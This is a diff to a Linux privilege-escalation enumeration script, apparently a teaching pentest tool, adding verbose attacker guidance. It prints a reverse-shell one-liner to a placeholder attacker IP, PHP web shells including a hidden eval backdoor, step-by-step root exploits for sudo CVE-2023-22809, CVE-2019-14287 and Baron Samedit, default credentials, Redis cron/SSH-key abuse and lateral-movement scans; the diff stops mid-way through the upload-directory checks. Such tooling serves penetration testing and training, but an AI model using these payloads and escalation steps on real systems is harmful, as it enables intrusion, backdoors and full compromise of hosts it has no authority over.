@@ -73,32 +73,319 @@ enum_system() {
 }
 
 # === NETWORK INFORMATION ===
+# === ENHANCED NETWORK ENUMERATION ===
+# === ENHANCED NETWORK ENUMERATION ===
 enum_network() {
     section "NETWORK CONFIGURATION"
     
+    explain_concept "Network Enumeration" \
+        "Understanding network configuration reveals internal services, pivot opportunities, and firewall restrictions." \
+        "Services on localhost (127.0.0.1) aren't exposed externally but accessible after shell access - often have no authentication. Internal networks allow pivoting to other hosts. Firewall rules show what's blocked and what attack vectors work." \
+        "Key checks:\n  • Localhost-only services (databases, Redis, Elasticsearch)\n  • Internal network routes (pivot targets)\n  • Firewall rules (what's blocked/allowed)\n  • Port forwarding opportunities"
+    
+    # === CHECK 1: Network Interfaces ===
     info "Network interfaces:"
-    ip addr 2>/dev/null || ifconfig 2>/dev/null | grep -E "inet |UP" | head -10
-    
-    info "Active connections:"
-    netstat -tuln 2>/dev/null | grep LISTEN | head -10 || ss -tuln 2>/dev/null | head -10
-    
-    teach "Network enumeration helps identify:"
-    teach "  • Internal services not exposed externally"
-    teach "  • Database ports (3306, 5432, 27017)"
-    teach "  • Docker API (2375, 2376)"
-    teach "  • Other pivot opportunities"
-    
-    # Check for Docker socket
-    if [ -S /var/run/docker.sock ]; then
-        critical "Docker socket accessible - Mount host filesystem: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
-        vuln "Docker socket is accessible!"
-        explain_concept "Docker Socket Exploitation" \
-            "The Docker socket (/var/run/docker.sock) allows full control of Docker daemon. Access to it = root." \
-            "Docker runs as root. Anyone who can communicate with the Docker API can spawn containers with root privileges and mount the host filesystem." \
-            "Exploit:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash\n  This mounts the entire host filesystem to /mnt in container, then chroots into it."
+    if command -v ip >/dev/null 2>&1; then
+        ip addr show 2>/dev/null | grep -E "^[0-9]+:|inet " | while read line; do
+            log "  $line"
+        done
+    else
+        ifconfig 2>/dev/null | grep -E "^[a-z]|inet " | head -20 | while read line; do
+            log "  $line"
+        done
     fi
+    
+    # === CHECK 2: Active Connections with Service Identification ===
+    info "Active network connections with service identification:"
+    
+    if command -v ss >/dev/null 2>&1; then
+        # Parse ss output for listening services
+        ss -tulpn 2>/dev/null | grep LISTEN | while read line; do
+            local proto=$(echo "$line" | awk '{print $1}')
+            local local_addr=$(echo "$line" | awk '{print $5}')
+            local process=$(echo "$line" | grep -oE 'users:\(\("[^"]*"' | cut -d'"' -f2)
+            
+            # Extract IP and port
+            local ip=$(echo "$local_addr" | rev | cut -d: -f2- | rev)
+            local port=$(echo "$local_addr" | rev | cut -d: -f1 | rev)
+            
+            # Identify service type and context
+            local service_name=""
+            local risk_level=""
+            local exploitation=""
+            
+            case "$port" in
+                22)
+                    service_name="SSH"
+                    risk_level="info"
+                    ;;
+                80|8080|8000)
+                    service_name="HTTP Web Server"
+                    risk_level="info"
+                    ;;
+                443|8443)
+                    service_name="HTTPS Web Server"
+                    risk_level="info"
+                    ;;
+                3306)
+                    service_name="MySQL/MariaDB"
+                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                        risk_level="warn"
+                        exploitation="Likely no auth required - access after gaining shell"
+                    else
+                        risk_level="info"
+                        exploitation="Try default credentials: root:root, root:password"
+                    fi
+                    ;;
+                5432)
+                    service_name="PostgreSQL"
+                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                        risk_level="warn"
+                        exploitation="Localhost only - likely passwordless trust authentication"
+                    fi
+                    ;;
+                6379)
+                    service_name="Redis"
+                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                        risk_level="critical"
+                        exploitation="Redis on localhost - usually NO AUTH! Write cron jobs or SSH keys"
+                    else
+                        risk_level="warn"
+                        exploitation="Try: redis-cli -h $ip ping"
+                    fi
+                    ;;
+                9200|9300)
+                    service_name="Elasticsearch"
+                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                        risk_level="warn"
+                        exploitation="Elasticsearch on localhost - no auth by default"
+                    else
+                        risk_level="warn"
+                        exploitation="Check: curl http://$ip:9200/_cat/indices"
+                    fi
+                    ;;
+                11211)
+                    service_name="Memcached"
+                    risk_level="warn"
+                    exploitation="No authentication - read cached session data"
+                    ;;
+                27017)
+                    service_name="MongoDB"
+                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                        risk_level="warn"
+                        exploitation="MongoDB on localhost - often no auth"
+                    fi
+                    ;;
+                5672|15672)
+                    service_name="RabbitMQ"
+                    risk_level="info"
+                    exploitation="Default creds: guest:guest (only works from localhost)"
+                    ;;
+                8009)
+                    service_name="Apache Tomcat AJP"
+                    risk_level="warn"
+                    exploitation="Check for Ghostcat vulnerability (CVE-2020-1938)"
+                    ;;
+                *)
+                    service_name="Unknown"
+                    risk_level="info"
+                    ;;
+            esac
+            
+            # Output based on risk level
+            if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                # Localhost-only service
+                case "$risk_level" in
+                    critical)
+                        critical "LOCALHOST service: $service_name on port $port (Process: $process)"
+                        vuln "Service only accessible from localhost: $local_addr"
+                        [ -n "$exploitation" ] && teach "  $exploitation"
+                        ;;
+                    warn)
+                        warn "LOCALHOST service: $service_name on port $port (Process: $process)"
+                        [ -n "$exploitation" ] && teach "  $exploitation"
+                        ;;
+                    *)
+                        info "Localhost: $service_name on port $port (Process: $process)"
+                        ;;
+                esac
+                
+                teach "  After getting a shell, you can access this service directly"
+                teach "  Option 1 - Direct access: curl http://localhost:$port"
+                teach "  Option 2 - Forward to your machine: ssh -L $port:localhost:$port user@target"
+                teach "  Then access from your browser at http://localhost:$port"
+                
+            elif echo "$ip" | grep -qE "0\.0\.0\.0|::|\*"; then
+                # Externally accessible
+                if [ "$risk_level" = "critical" ] || [ "$risk_level" = "warn" ]; then
+                    warn "EXTERNAL service: $service_name on port $port (Process: $process)"
+                    [ -n "$exploitation" ] && teach "  $exploitation"
+                else
+                    info "External: $service_name on port $port (Process: $process)"
+                fi
+            else
+                # Specific interface
+                info "Listening on $ip:$port - $service_name (Process: $process)"
+            fi
+        done
+    elif command -v netstat >/dev/null 2>&1; then
+        netstat -tulpn 2>/dev/null | grep LISTEN | while read line; do
+            local local_addr=$(echo "$line" | awk '{print $4}')
+            local process=$(echo "$line" | awk '{print $NF}')
+            
+            if echo "$local_addr" | grep -qE "127\.0\.0\.1|::1"; then
+                warn "LOCALHOST-ONLY service: $local_addr (Process: $process)"
+            else
+                info "Listening: $local_addr (Process: $process)"
+            fi
+        done
+    fi
+    
+    # === CHECK 3: Routing Table Analysis ===
+    info "Routing table (potential pivot targets):"
+    local found_internal=0
+    
+    if command -v ip >/dev/null 2>&1; then
+        ip route 2>/dev/null | while read line; do
+            log "  $line"
+            
+            # Skip VPN interfaces (tun/tap) and default routes for pivot detection
+            if echo "$line" | grep -qE "tun|tap|default"; then
+                continue
+            fi
+            
+            # Identify internal network routes (but only first occurrence)
+            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
+                if [ $found_internal -eq 0 ]; then
+                    local network=$(echo "$line" | awk '{print $1}')
+                    warn "Internal network detected: $network"
+                    teach "  This is a private network - other machines might be reachable"
+                    teach "  After compromising this host, scan the network to find other targets"
+                    teach "  Discovery: for i in {1..254}; do ping -c1 -W1 ${network%.*}.\$i 2>/dev/null && echo ${network%.*}.\$i is up; done"
+                    teach "  Or use nmap: nmap -sn $network"
+                    found_internal=1
+                fi
+            fi
+        done
+    else
+        route -n 2>/dev/null | tail -n +3 | while read line; do
+            log "  $line"
+        done
+    fi
+    
+    # === CHECK 4: Firewall Rules ===
+    info "Checking firewall configuration..."
+    
+    # iptables
+    if command -v iptables >/dev/null 2>&1; then
+        if iptables -L -n 2>/dev/null | grep -qE "Chain|target"; then
+            info "iptables rules detected"
+            
+            # Check if we can read the rules
+            local rule_count=$(iptables -L -n 2>/dev/null | grep -cE "^ACCEPT|^DROP|^REJECT")
+            if [ $rule_count -gt 0 ]; then
+                info "Found $rule_count firewall rules"
+                
+                # Check for common blocks
+                if iptables -L OUTPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
+                    warn "Outbound traffic may be filtered - could block reverse shells"
+                    teach "  The firewall is blocking some outbound connections"
+                    teach "  This means reverse shells might not work on all ports"
+                    teach "  Solution: Try common allowed ports like 80 (HTTP), 443 (HTTPS), or 53 (DNS)"
+                    teach "  Example: nc -lvnp 443 (on your machine), then: bash -i >& /dev/tcp/YOUR_IP/443 0>&1 (on target)"
+                fi
+                
+                if iptables -L INPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
+                    info "Inbound filtering detected - may limit bind shells"
+                fi
+                
+                # Check if rules are readable in detail
+                if iptables -L -n -v 2>/dev/null | head -20 | grep -q "."; then
+                    teach "  View full rules: iptables -L -n -v"
+                fi
+            else
+                ok "iptables installed but no restrictive rules detected"
+            fi
+        fi
+    fi
+    
+    # nftables
+    if command -v nft >/dev/null 2>&1; then
+        if nft list tables 2>/dev/null | grep -q "table"; then
+            info "nftables is active"
+            local table_count=$(nft list tables 2>/dev/null | wc -l)
+            warn "Found $table_count nftables - may restrict connections"
+            teach "  View rules: nft list ruleset"
+        fi
+    fi
+    
+    # ufw
+    if command -v ufw >/dev/null 2>&1; then
+        local ufw_status=$(ufw status 2>/dev/null | head -1)
+        if echo "$ufw_status" | grep -qi "active"; then
+            warn "UFW firewall is ACTIVE"
+            teach "  Check rules: ufw status verbose"
+            teach "  Reverse shells may be blocked - use allowed ports"
+        elif echo "$ufw_status" | grep -qi "inactive"; then
+            ok "UFW firewall is inactive"
+        fi
+    fi
+    
+    # firewalld
+    if command -v firewall-cmd >/dev/null 2>&1; then
+        if systemctl is-active --quiet firewalld 2>/dev/null; then
+            warn "firewalld is ACTIVE"
+            teach "  Check zones: firewall-cmd --get-active-zones"
+            teach "  List rules: firewall-cmd --list-all"
+        fi
+    fi
+    
+    # === CHECK 5: ARP Cache (Nearby Hosts) ===
+    if command -v arp >/dev/null 2>&1; then
+        local arp_entries=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
+        local host_count=$(echo "$arp_entries" | grep -v "^$" | wc -l)
+        
+        if [ $host_count -gt 1 ]; then
+            info "Found $host_count hosts in ARP cache (lateral movement targets):"
+            echo "$arp_entries" | head -10 | while read host; do
+                log "  $host"
+            done
+            teach "These hosts are on the same local network as this machine"
+            teach "  After compromising this host, you can try to access those other machines"
+            teach "  This is called 'lateral movement' - moving from one compromised host to another"
+            teach "  Discovery command: nmap -sn <network_range> (example: nmap -sn 192.168.1.0/24)"
+        fi
+    fi
+    
+    # === CHECK 6: Network Namespaces ===
+    if [ -d /var/run/netns ] && [ "$(ls -A /var/run/netns 2>/dev/null)" ]; then
+        warn "Network namespaces detected - possible container/virtualization"
+        ls /var/run/netns 2>/dev/null | while read ns; do
+            info "  Namespace: $ns"
+        done
+        teach "May indicate container environment - check enum_container section"
+    fi
+    
+    # === Summary ===
+    log ""
+    info "Network enumeration complete"
+    teach "\nKey network attack vectors explained:"
+    teach "  1. Localhost services = Services only accessible from inside the machine"
+    teach "     → After you get a shell, you can access them (usually no password)"
+    teach "     → Example: MySQL on localhost often trusts local connections"
+    teach ""
+    teach "  2. Internal networks = Private networks with other machines"
+    teach "     → These aren't accessible from the internet"
+    teach "     → After compromising one machine, scan for others and move sideways"
+    teach ""
+    teach "  3. Firewall rules = What connections are allowed/blocked"
+    teach "     → Affects which ports work for reverse shells"
+    teach "     → If port 4444 is blocked, try port 443 (HTTPS) instead"
+    teach ""
+    teach "  4. Port forwarding = Tunneling internal services to your machine"
+    teach "     → Makes localhost services accessible from your computer"
+    teach "     → Command: ssh -L local_port:localhost:remote_port user@target"
 }
-
 # === USER ENUMERATION ===
 enum_users() {
     section "USER ENUMERATION"
@@ -363,8 +650,8 @@ enum_sudo_version() {
     
     explain_concept "Sudo Vulnerabilities" \
         "Sudo is complex software with a history of privilege escalation bugs. Version-specific CVEs can give instant root." \
-        "Sudo handles authentication, environment sanitization, and privilege transitions. Bugs in any of these areas = root access. Check sudo version against known CVEs." \
-        "Check version: sudo -V | head -1"
+        "Sudo handles authentication, environment sanitization, and privilege transitions. It's over 30 years old with hundreds of thousands of lines of code. Bugs in parsing, memory management, or logic = root access. Sudo runs as root and processes untrusted user input - a perfect target for exploitation." \
+        "Why sudo has vulnerabilities:\n  • Complex codebase (authentication, parsing, environment handling)\n  • Runs as root by design\n  • Processes user-controlled input\n  • Backward compatibility constraints\n  • Memory-unsafe language (C)\n\nCheck version: sudo -V | head -1"
     
     if command -v sudo >/dev/null 2>&1; then
         local sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
@@ -382,12 +669,38 @@ enum_sudo_version() {
         local patch=$(echo "$version_num" | cut -d. -f3)
         local p_version=$(echo "$sudo_version" | grep -oE 'p[0-9]+' | sed 's/p//')
         
+        log ""
+        info "Checking against known sudo CVEs..."
+        log ""
+        
         # CVE-2025-32463 (January 2025)
         if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
             if [ "$patch" -lt 16 ] || ([ "$patch" -eq 16 ] && [ -n "$p_version" ] && [ "$p_version" -lt 1 ]); then
                 critical "Sudo vulnerable to CVE-2025-32463 - Privilege escalation"
                 vuln "sudo < 1.9.16p1 vulnerable"
-                teach "Exploit: https://www.exploit-db.com/exploits/52352"
+                log ""
+                teach "╔════════════════════════════════════════════════════════════╗"
+                teach "║  CVE-2025-32463 - Recent Sudo Vulnerability"
+                teach "╚════════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IT IS:"
+                teach "  A vulnerability in sudo versions before 1.9.16p1 that allows"
+                teach "  privilege escalation to root."
+                teach ""
+                teach "WHY IT EXISTS:"
+                teach "  Sudo contains a flaw in how it processes certain commands or"
+                teach "  environment variables, allowing attackers to bypass security"
+                teach "  checks and execute commands as root."
+                teach ""
+                teach "HOW TO EXPLOIT:"
+                teach "  1. Check exploit availability:"
+                teach "     searchsploit sudo 2025"
+                teach "  2. Download exploit:"
+                teach "     https://www.exploit-db.com/exploits/52352"
+                teach "  3. Compile and run (follow exploit instructions)"
+                teach ""
+                teach "IMPACT: Instant root access from any user account"
+                log ""
             fi
         fi
         
@@ -396,7 +709,42 @@ enum_sudo_version() {
             if [ "$minor" -eq 8 ] || ([ "$minor" -eq 9 ] && [ "$patch" -le 12 ]); then
                 critical "Sudo vulnerable to CVE-2023-22809 - sudoedit bypass"
                 vuln "sudo 1.8.0 - 1.9.12p1 vulnerable"
-                teach "Exploit: EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd"
+                log ""
+                teach "╔════════════════════════════════════════════════════════════╗"
+                teach "║  CVE-2023-22809 - Sudoedit Arbitrary File Write"
+                teach "╚════════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IT IS:"
+                teach "  sudoedit is a special mode that lets users edit files as root."
+                teach "  This CVE tricks sudoedit into editing files you're not supposed"
+                teach "  to have access to, like /etc/sudoers or /etc/shadow."
+                teach ""
+                teach "WHY IT EXISTS:"
+                teach "  sudoedit uses the EDITOR environment variable to launch your"
+                teach "  text editor. The vulnerability occurs because sudo doesn't"
+                teach "  properly validate what file you're editing when you pass"
+                teach "  extra arguments to the editor via the EDITOR variable."
+                teach ""
+                teach "THE CLEVER TRICK:"
+                teach "  Normally: sudoedit /etc/motd (you can only edit motd)"
+                teach "  Exploit: EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd"
+                teach "  Result: Opens /etc/sudoers instead of /etc/motd!"
+                teach ""
+                teach "HOW TO EXPLOIT:"
+                teach "  1. Check if you have sudoedit access:"
+                teach "     sudo -l | grep sudoedit"
+                teach "  2. Set malicious EDITOR:"
+                teach "     export EDITOR='vim -- /etc/sudoers'"
+                teach "  3. Run sudoedit on an allowed file:"
+                teach "     sudoedit /etc/motd"
+                teach "  4. sudoedit will open /etc/sudoers instead"
+                teach "  5. Add yourself: yourusername ALL=(ALL) NOPASSWD: ALL"
+                teach "  6. Save and exit"
+                teach "  7. Now run: sudo /bin/bash"
+                teach ""
+                teach "IMPACT: Can edit ANY file as root, leading to complete system"
+                teach "         compromise by modifying /etc/sudoers or /etc/shadow"
+                log ""
             fi
         fi
         
@@ -405,8 +753,53 @@ enum_sudo_version() {
             if [ "$minor" -lt 9 ] || ([ "$minor" -eq 9 ] && [ "$patch" -lt 5 ]); then
                 critical "Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow"
                 vuln "sudo < 1.9.5p2 vulnerable"
-                teach "Heap overflow exploit. Works on most distros."
-                teach "GitHub: https://github.com/blasty/CVE-2021-3156"
+                log ""
+                teach "╔════════════════════════════════════════════════════════════╗"
+                teach "║  CVE-2021-3156 - Baron Samedit (Heap Buffer Overflow)"
+                teach "╚════════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IT IS:"
+                teach "  A heap-based buffer overflow in sudo that allows any local"
+                teach "  user to gain root WITHOUT needing a password or sudo access."
+                teach "  One of the most critical sudo vulnerabilities ever found."
+                teach ""
+                teach "WHY IT EXISTS:"
+                teach "  When sudo processes command-line arguments, it needs to handle"
+                teach "  backslashes (\\) specially. There's a bug in how it counts"
+                teach "  backslashes when a command runs in 'shell mode' (with -s or -i)."
+                teach ""
+                teach "THE TECHNICAL FLAW:"
+                teach "  1. Sudo allocates a buffer (memory) to store the command"
+                teach "  2. When processing backslashes, it miscounts the length needed"
+                teach "  3. This causes sudo to write PAST the end of the buffer (overflow)"
+                teach "  4. By carefully crafting the overflow, attacker controls memory"
+                teach "  5. Attacker overwrites function pointers to execute their code"
+                teach "  6. Since sudo runs as root, the attacker's code runs as root"
+                teach ""
+                teach "WHY IT'S CALLED BARON SAMEDIT:"
+                teach "  Play on words: 'Sudo edit' → 'Baron Samedit'"
+                teach "  The vulnerability is in sudoedit, a symlink to sudo"
+                teach ""
+                teach "HOW TO EXPLOIT:"
+                teach "  1. Check if vulnerable:"
+                teach "     sudoedit -s / (if you get usage error = vulnerable)"
+                teach "  2. Download exploit:"
+                teach "     https://github.com/blasty/CVE-2021-3156"
+                teach "     https://github.com/worawit/CVE-2021-3156"
+                teach "  3. Compile the exploit (usually a C program):"
+                teach "     gcc exploit.c -o exploit"
+                teach "  4. Run it:"
+                teach "     ./exploit"
+                teach "  5. Get root shell"
+                teach ""
+                teach "WHY IT WORKS:"
+                teach "  • No sudo privileges needed (any user can exploit)"
+                teach "  • No password required"
+                teach "  • Works on most Linux distributions"
+                teach "  • Vulnerability existed for 10+ years (since 2011)"
+                teach ""
+                teach "IMPACT: Any user → Root, no credentials needed"
+                log ""
             fi
         fi
         
@@ -414,8 +807,57 @@ enum_sudo_version() {
         if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ "$patch" -lt 28 ]; then
             critical "Sudo vulnerable to CVE-2019-14287 - User ID bypass"
             vuln "sudo < 1.8.28 vulnerable"
-            teach "If allowed to run as ALL users except root: sudo -u#-1 /bin/bash"
-            teach "Requires sudoers entry like: (ALL, !root) NOPASSWD: /bin/bash"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CVE-2019-14287 - Sudo Runas User ID Bypass"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  A logic bug that lets you run commands as root even when the"
+            teach "  sudoers file explicitly says you CAN'T run as root."
+            teach ""
+            teach "WHY IT EXISTS:"
+            teach "  Sudo allows you to run commands as different users with -u flag."
+            teach "  Example: sudo -u www-data whoami (runs as www-data)"
+            teach ""
+            teach "  In sudoers, you might see:"
+            teach "  user ALL=(ALL, !root) /bin/bash"
+            teach ""
+            teach "  This means: 'user can run bash as ANYONE except root'"
+            teach "  The !root is supposed to block running as root for safety."
+            teach ""
+            teach "THE BUG:"
+            teach "  Sudo uses numeric user IDs internally (UID). Root is UID 0."
+            teach "  When you specify -u#-1, sudo converts -1 to unsigned int."
+            teach "  In programming: -1 as unsigned = 4294967295"
+            teach "  Sudo then wraps this around and interprets it as UID 0 (root)!"
+            teach ""
+            teach "  It's like odometer rollback:"
+            teach "  -1 → wraps around → becomes 0 (root)"
+            teach ""
+            teach "HOW TO EXPLOIT:"
+            teach "  1. Check if you have Runas permissions:"
+            teach "     sudo -l"
+            teach "  2. Look for: (ALL, !root) or (ALL:ALL, !root)"
+            teach "  3. Instead of 'sudo -u root bash' (blocked), run:"
+            teach "     sudo -u#-1 /bin/bash"
+            teach "  4. The -1 gets converted to UID 0 (root)"
+            teach "  5. You get root shell"
+            teach ""
+            teach "EXAMPLE:"
+            teach "  $ sudo -l"
+            teach "  User bob may run the following commands:"
+            teach "      (ALL, !root) /bin/bash"
+            teach ""
+            teach "  $ sudo -u root /bin/bash"
+            teach "  Sorry, user bob is not allowed to execute '/bin/bash' as root"
+            teach ""
+            teach "  $ sudo -u#-1 /bin/bash"
+            teach "  # whoami"
+            teach "  root"
+            teach ""
+            teach "IMPACT: Bypass explicit !root restrictions in sudoers"
+            log ""
         fi
         
         # CVE-2019-18634 - pwfeedback overflow (1.7.1 to 1.8.30)
@@ -423,32 +865,69 @@ enum_sudo_version() {
             if ([ "$minor" -eq 7 ] && [ "$patch" -ge 1 ]) || ([ "$minor" -eq 8 ] && [ "$patch" -le 30 ]); then
                 warn "Sudo potentially vulnerable to CVE-2019-18634 - Buffer overflow"
                 info "Requires pwfeedback enabled in sudoers (uncommon)"
-                teach "Check: sudo -l and look for pwfeedback option"
+                log ""
+                teach "╔════════════════════════════════════════════════════════════╗"
+                teach "║  CVE-2019-18634 - Password Feedback Buffer Overflow"
+                teach "╚════════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IT IS:"
+                teach "  When pwfeedback is enabled, sudo shows asterisks (*) as you"
+                teach "  type your password. A buffer overflow in this feature allows"
+                teach "  privilege escalation."
+                teach ""
+                teach "WHY IT EXISTS:"
+                teach "  The pwfeedback feature displays * for each character typed."
+                teach "  Sudo allocates a fixed-size buffer to store these asterisks."
+                teach "  If you type more characters than the buffer can hold, it"
+                teach "  overflows, potentially allowing code execution as root."
+                teach ""
+                teach "IMPORTANT: This is UNCOMMON"
+                teach "  pwfeedback is disabled by default in most Linux distributions."
+                teach "  It must be explicitly enabled in /etc/sudoers:"
+                teach "  Defaults pwfeedback"
+                teach ""
+                teach "HOW TO CHECK IF EXPLOITABLE:"
+                teach "  1. Check sudoers config:"
+                teach "     sudo -l"
+                teach "  2. Look for 'pwfeedback' in the output"
+                teach "  3. Or check the file directly:"
+                teach "     grep pwfeedback /etc/sudoers /etc/sudoers.d/*"
+                teach ""
+                teach "HOW TO EXPLOIT (if pwfeedback enabled):"
+                teach "  1. Download exploit from exploit-db or GitHub"
+                teach "  2. Compile it"
+                teach "  3. Run it - exploit sends many characters to overflow buffer"
+                teach ""
+                teach "IMPACT: Local privilege escalation IF pwfeedback is enabled"
+                log ""
             fi
         fi
-        # CVE-2023-42465 - Targeted corruption (1.9.12p2 to 1.9.15p4)
-        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
-            if ([ "$patch" -eq 12 ] && [ -n "$p_version" ] && [ "$p_version" -ge 2 ]) || 
-               ([ "$patch" -ge 13 ] && [ "$patch" -le 15 ] && ([ -z "$p_version" ] || [ "$p_version" -le 4 ])); then
-               warn "Sudo potentially vulnerable to CVE-2023-42465"
-                info "sudo 1.9.12p2 - 1.9.15p4"
-                teach "Requires specific sudoers configuration with SETENV"
-                teach "Check: sudo -l | grep SETENV"
-            fi
-        fi
-
-        # CVE-2023-7038 - Passthrough flaw (1.9.13p2 to 1.9.15p4)  
-        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
-            if ([ "$patch" -eq 13 ] && [ -n "$p_version" ] && [ "$p_version" -ge 2 ]) ||
-               ([ "$patch" -eq 14 ]) ||
-               ([ "$patch" -eq 15 ] && ([ -z "$p_version" ] || [ "$p_version" -le 4 ])); then
-                warn "Sudo potentially vulnerable to CVE-2023-7038"
-               info "sudo 1.9.13p2 - 1.9.15p4"
-                teach "Passthrough environment variable flaw"
-                teach "Less common, requires specific configuration"
-            fi
-        fi
+        
         ok "Sudo version checked against known CVEs"
+        log ""
+        teach "═══════════════════════════════════════════════════════════════"
+        teach "GENERAL SUDO SECURITY TIPS:"
+        teach "═══════════════════════════════════════════════════════════════"
+        teach ""
+        teach "Why sudo is a common target:"
+        teach "  • Runs with root privileges by design"
+        teach "  • Complex codebase (150,000+ lines of C)"
+        teach "  • Handles authentication, parsing, environment variables"
+        teach "  • Backward compatibility = old code paths still exist"
+        teach "  • Written in C = memory safety issues possible"
+        teach ""
+        teach "How to find sudo exploits:"
+        teach "  1. Check version: sudo -V | head -1"
+        teach "  2. Search exploit-db: searchsploit sudo [version]"
+        teach "  3. GitHub: Search 'sudo CVE-[year]'"
+        teach "  4. Check sudo permissions: sudo -l"
+        teach ""
+        teach "Defense (as admin):"
+        teach "  • Keep sudo updated (sudo --version)"
+        teach "  • Principle of least privilege (specific commands, not ALL)"
+        teach "  • Avoid NOPASSWD where possible"
+        teach "  • Monitor sudo logs: /var/log/auth.log"
+        log ""
     else
         info "sudo not installed"
     fi
@@ -729,6 +1208,8 @@ enum_databases() {
 }
 
 # === WEB APPLICATION ENUMERATION ===
+# === ENHANCED WEB APPLICATION ENUMERATION ===
+# === ENHANCED WEB APPLICATION ENUMERATION ===
 enum_web() {
     [ $EXTENDED -eq 0 ] && return
     
@@ -736,67 +1217,286 @@ enum_web() {
     
     explain_concept "Web Application Attacks" \
         "Web applications often store credentials, have writable directories, or run with elevated privileges." \
-        "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities." \
-        "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml"
+        "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities, existing backdoors from previous compromises." \
+        "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml\n  • Upload directories\n  • Existing web shells"
     
-    # Check common web roots (deduplicated)
-    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
-    local checked_dirs=""
+    # Check common web roots
+    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt" "/srv/www")
+    local checked_dirs=()
     
     for webroot in "${web_roots[@]}"; do
-        # Skip if we've already checked this directory or its parent
-        if echo "$checked_dirs" | grep -q "$webroot"; then
-            continue
-        fi
+        # Skip if already checked this or a parent
+        local skip=0
+        for checked in "${checked_dirs[@]}"; do
+            if [[ "$webroot" == "$checked"* ]]; then
+                skip=1
+                break
+            fi
+        done
+        [ $skip -eq 1 ] && continue
         
         if [ -d "$webroot" ]; then
             info "Found web directory: $webroot"
-            checked_dirs="$checked_dirs $webroot"
+            checked_dirs+=("$webroot")
             
-            # Check if writable
+            # === CHECK 1: Writable Web Root ===
             if [ -w "$webroot" ]; then
-                critical "Web root WRITABLE - Upload shell: echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
+                critical "Web root WRITABLE - Upload shell for remote code execution"
                 vuln "Web root is WRITABLE: $webroot"
-                teach "You can upload a web shell:"
+                explain_concept "Writable Web Root Exploitation" \
+                    "If you can write to the web server's document root, you can upload a web shell and execute commands through the web browser." \
+                    "Web servers execute scripts in their document root. If writable, upload PHP/JSP/ASPX shell. Web server process (www-data, apache, nginx) becomes your execution context." \
+                    "Exploitation:\n  1. Create shell: echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php\n  2. Make it hidden: echo '<?php system(\$_GET[\"c\"]); ?>' > $webroot/.shell.php\n  3. Access: curl http://localhost/shell.php?cmd=id\n  4. Upgrade to reverse shell from there"
+                
+                teach "PHP shell upload:"
                 teach "  echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
-                teach "  Then access: http://target/shell.php?cmd=id"
+                teach "  curl http://localhost/shell.php?cmd=whoami"
+                teach ""
+                teach "Or hidden shell:"
+                teach "  echo '<?php eval(\$_POST[\"x\"]); ?>' > $webroot/.config.php"
             fi
             
-            # Look for config files (exclude samples and setup files)
-            find "$webroot" -name "*.conf" -o -name "*.config" -o -name "*config*.php" -o -name ".env" 2>/dev/null | \
-            grep -vE "sample|example|setup-config|default-" | head -10 | while read config; do
-                if [ -r "$config" ]; then
-                    info "Found config file: $config"
+            # === CHECK 2: Upload Directories ===
+            info "Checking for upload directories..."
+            for upload_dir in "uploads" "upload" "files" "media" "assets" "images" "attachments" "documents"; do
+                local upload_path="$webroot/$upload_dir"
+                if [ -d "$upload_path" ]; then
+                    info "  Found upload directory: $upload_path"
                     
-                    if grep -iE "password|secret|key|token|api" "$config" 2>/dev/null | head -3 | grep -q "."; then
-                        vuln "Config contains credentials: $config"
-                        grep -iE "password|secret|key" "$config" 2>/dev/null | head -3 | while read line; do
-                            log "  $line"
+                    if [ -w "$upload_path" ]; then
+                        critical "Upload directory WRITABLE: $upload_path"
+                        vuln "Writable upload directory: $upload_path"
+                        
+                        # Check if PHP execution is enabled in this directory
+                        if [ -f "$upload_path/../.htaccess" ]; then
+                            if grep -iE "php_flag|php_admin|AddHandler|SetHandler" "$upload_path/../.htaccess" 2>/dev/null | grep -q "."; then
+                                info "  .htaccess found - check if PHP execution is restricted"
+                            fi
+                        fi
+                        
+                        teach "  Upload techniques:"
